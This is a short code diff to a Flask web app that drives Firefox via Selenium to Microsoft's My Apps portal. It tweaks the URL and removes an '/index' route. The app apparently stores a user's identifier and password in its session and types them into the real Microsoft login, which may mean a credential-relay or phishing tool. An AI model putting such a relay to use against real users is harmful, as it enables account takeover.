@@ -20,7 +20,7 @@ WEB_DRIVER_PATH = CURRENT_WORKING_DIRECTORY + "\\app\\" + WEB_DRIVER_NAME
 WEB_DRIVER_SERVICE = Service(executable_path = WEB_DRIVER_PATH)
 DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE)
 
-DRIVER.get("https://myapps.microsoft.com/")
+DRIVER.get("https://myapps.microsoft.com")
 
 password_changed = False
 
@@ -84,7 +84,6 @@ def Fill_Email(email):
         return True
 
 @app.route("/")
-@app.route("/index")
 def index():
     if "identifier" not in session or "password" not in session or not password_changed:
         return redirect(url_for("login"))
